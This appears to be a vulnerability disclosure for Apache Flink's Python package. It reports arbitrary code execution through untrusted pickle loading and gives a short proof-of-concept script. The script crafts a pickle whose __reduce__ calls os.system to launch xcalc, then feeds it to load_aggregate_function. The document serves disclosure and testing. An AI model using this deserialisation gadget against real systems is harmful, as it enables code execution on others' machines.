# Description
Apache Flink is an open source stream processing framework with powerful stream- and batch-processing capabilities.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
1. run exploit.py
```python
import os
import pickle
#os.system('pip3 install apache-flink')
from pyflink.fn_execution import operation_utils
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
dumps = pickle.dumps(ArbitraryCode())
operation_utils.load_aggregate_function(dumps)
```
* `pip3 install apache-flink`
* `python3 exploit.py`
